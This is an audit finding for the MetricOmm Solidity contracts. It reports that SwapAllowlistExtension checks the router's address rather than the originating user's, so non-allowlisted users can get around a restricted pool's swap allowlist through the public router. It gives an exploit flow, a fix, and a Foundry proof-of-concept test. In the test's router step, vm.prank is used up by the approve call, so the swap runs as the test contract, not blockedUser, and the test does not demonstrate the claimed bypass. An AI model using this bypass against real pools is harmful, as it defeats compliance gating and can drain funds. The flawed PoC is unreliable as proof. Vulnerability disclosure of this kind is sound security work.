Audit Report

## Title
`SwapAllowlistExtension` checks router address instead of original user, enabling allowlist bypass - (File: metric-periphery/contracts/extensions/SwapAllowlistExtension.sol)

## Summary
`MetricOmmPool.swap` passes `msg.sender` as `sender` to `_beforeSwap`, which is the router contract address when a user routes through `MetricOmmSimpleRouter`. `SwapAllowlistExtension.beforeSwap` gates access by checking `allowedSwapper[pool][sender]`, so it checks the router's address rather than the originating user's address. Any non-allowlisted user can bypass the swap allowlist by routing through the public router if the router itself is allowlisted.

## Finding Description
**Root cause – `sender` binding in `MetricOmmPool.swap`:**

`MetricOmmPool.sol` line 230–240 calls:
```solidity
_beforeSwap(
  msg.sender,   // <-- always the direct caller of pool.swap()
  recipient,
  ...
);
```

When a user calls `MetricOmmSimpleRouter.exactInputSingle` (or any other router entry point), the router calls `pool.swap(...)` directly (lines 72–80 of `MetricOmmSimpleRouter.sol`). Therefore `msg.sender` seen by the pool is the **router address**, not the originating EOA.

**Guard check in `SwapAllowlistExtension.beforeSwap`:**
```solidity
function beforeSwap(address sender, ...) external view override returns (bytes4) {
    if (!allowAllSwappers[msg.sender] && !allowedSwapper[msg.sender][sender]) {
        revert IMetricOmmPoolActions.NotAllowedToSwap();
    }
    ...
}
```
`sender` here is the router address. The extension checks `allowedSwapper[pool][router]`, not `allowedSwapper[pool][originalUser]`.

**Exploit flow:**
1. Pool admin deploys a pool with `SwapAllowlistExtension` to restrict swaps to a curated set of addresses.
2. Pool admin allowlists `MetricOmmSimpleRouter` so that allowlisted users can conveniently use the router (a natural operational step).
3. Any non-allowlisted EOA calls `router.exactInputSingle(...)` targeting the restricted pool.
4. The router calls `pool.swap(recipient, ...)` — pool sees `msg.sender = router`.
5. `_beforeSwap(router, ...)` is dispatched; extension checks `allowedSwapper[pool][router]` → `true`.
6. Non-allowlisted user's swap executes successfully, bypassing the intended access control.

**Existing guards are insufficient:** The `onlyPool` modifier on the extension only verifies the caller is a known pool; it does not recover the original user. There is no mechanism in the pool or extension to forward the originating EOA through the router hop.

## Impact Explanation
The swap allowlist is a core access-control mechanism for restricted pools (e.g., KYC-gated, institutional, or compliance-restricted pools). A non-allowlisted unprivileged user can execute swaps on a pool that was explicitly configured to deny them. This constitutes broken core pool functionality and an admin-boundary break: the pool admin's allowlist configuration is rendered ineffective for all router-mediated swaps. Depending on the pool's purpose, this can result in direct loss of funds (e.g., a pool designed to serve only specific counterparties is drained by an unauthorized party).

## Likelihood Explanation
The condition requires the router to be allowlisted on the restricted pool, which is a natural and expected operational step for any pool that wants to support router-based trading for its allowlisted users. Once the router is allowlisted, the bypass is trivially reachable by any EOA with no special privileges, is repeatable every block, and requires no front-running or timing.

## Recommendation
The pool should forward the original initiator through the hook arguments, or the extension should require the pool to pass a verified originator. One concrete fix: add an `originator` parameter to the swap hook interface (distinct from `sender`), populated by the router via `extensionData` and verified by the extension. Alternatively, `SwapAllowlistExtension` should treat the router as a transparent forwarder and require the originating user's address to be supplied and verified in `extensionData`, with the router explicitly encoding `msg.sender` before calling the pool.

## Proof of Concept
```solidity
// 1. Deploy pool with SwapAllowlistExtension; allowlist only `allowedUser` and `router`.
// 2. Call pool.swap() directly as `blockedUser` → reverts NotAllowedToSwap ✓
// 3. Call router.exactInputSingle({pool: pool, ...}) as `blockedUser` →
//    pool sees msg.sender = router → allowedSwapper[pool][router] = true → swap succeeds ✗
function test_swapAllowlist_bypassViaRouter() public {
    // Setup: pool with SwapAllowlistExtension, only router and allowedUser are allowlisted
    swapAllowlist.setAllowedToSwap(address(pool), address(router), true);
    swapAllowlist.setAllowedToSwap(address(pool), allowedUser, true);
    // blockedUser is NOT allowlisted

    // Direct swap as blockedUser → correctly blocked
    vm.prank(blockedUser);
    vm.expectRevert(IMetricOmmPoolActions.NotAllowedToSwap.selector);
    pool.swap(blockedUser, true, 1000, 0, "", "");

    // Router swap as blockedUser → bypasses allowlist
    vm.prank(blockedUser);
    // approve router to spend blockedUser's token0
    token0.approve(address(router), type(uint256).max);
    uint256 out = router.exactInputSingle(IMetricOmmSimpleRouter.ExactInputSingleParams({
        pool: address(pool), tokenIn: address(token0), tokenOut: address(token1),
        zeroForOne: true, amountIn: 1000, amountOutMinimum: 0,
        recipient: blockedUser, deadline: block.timestamp + 1, priceLimitX64: 0, extensionData: ""
    }));
    assertGt(out, 0); // blockedUser successfully swapped despite not being allowlisted
}
```
